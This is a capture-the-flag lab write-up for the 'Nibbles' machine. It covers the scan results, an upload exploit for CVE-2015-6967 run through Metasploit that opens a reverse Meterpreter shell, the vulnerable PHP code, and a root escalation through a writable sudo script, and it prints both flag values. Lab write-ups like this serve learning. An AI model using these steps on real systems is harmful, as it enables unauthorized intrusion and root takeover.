## Information

| Property     | Value                       |
|--------------|-----------------------------|
| **Name**     |  Nibbles |
| **IP Address**|    10.10.10.75    |
| **OS**       |    Linux     |
| **Difficulty**|   Easy |

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## Initial Access
### Port [80] - [Web Service]

Subdirectory exposed via HTML comments:
http://10.10.10.75/nibbleblog/

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
#### Vulnerability Exploited

Nibbleblog is vulnerable to unrestricted file upload [CVE-2015-6967](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6967) which can be exploited via metasploit: 
```shell
msf6 exploit(multi/http/nibbleblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Sending stage (39927 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 3 opened (10.10.14.6:4444 -> 10.10.10.75:60844) at 2023-11-19 18:45:26 +0100
meterpreter >
```

#### CVE-2015-6967

##### Vulnerability Description:

When uploading image files via the "My image" plugin - which isdelivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps theoriginal extension of uploaded files. This extension or the actual filetype are not checked, thus it is possible to upload PHP files and gaincode execution.

##### Vulnerable Code Snippet

```php
          if( $plugin->init_db() )
          {
            // upload files
            foreach($_FILES as $field_name=>$file)
            {
              $extension = strtolower(pathinfo($file['name'],
PATHINFO_EXTENSION));
              $destination = PATH_PLUGINS_DB.$plugin->get_dir_name();
              $complete = $destination.'/'.$field_name.'.'.$extension;
              // Upload the new file and move
              if(move_uploaded_file($file["tmp_name"], $complete))
              {
                // Resize images if requested by the plugin
                if(isset($_POST[$field_name.'_resize']))
                {
                  $width =
isset($_POST[$field_name.'_width'])?$_POST[$field_name.'_width']:200;
                  $height =
isset($_POST[$field_name.'_height'])?$_POST[$field_name.'_height']:200;
                  $option =
isset($_POST[$field_name.'_option'])?$_POST[$field_name.'_option']:'auto';
                  $quality =
isset($_POST[$field_name.'_quality'])?$_POST[$field_name.'_quality']:100;
                  $Resize->setImage($complete, $width, $height, $option);
                  $Resize->saveImage($complete, $quality, true);
                }
              }
            }
            unset($_POST['plugin']);
            // update fields
            $plugin->set_fields_db($_POST);
            Session::set_alert($_LANG['CHANGES_HAS_BEEN_SAVED_SUCCESSFULLY']);
          }
        }

```

### User Access



#### User Flag

``9698fdd4c3518fa27450a0e6141c70b1
## Privilege Escalation

User nibbler can run with high privileges:  
```
sudo -l 
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

Adding /bin/sh to the end of the script and executing it as root gives us a high privileged shell: 
```
echo /bin/sh >> monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
id
uid=0(root) gid=0(root) groups=0(root)
```

#### Root Flag

``ac3b91864ccc3ca85257334ac3cd3ccb

## Conclusion


## Additional Notes


## Resources
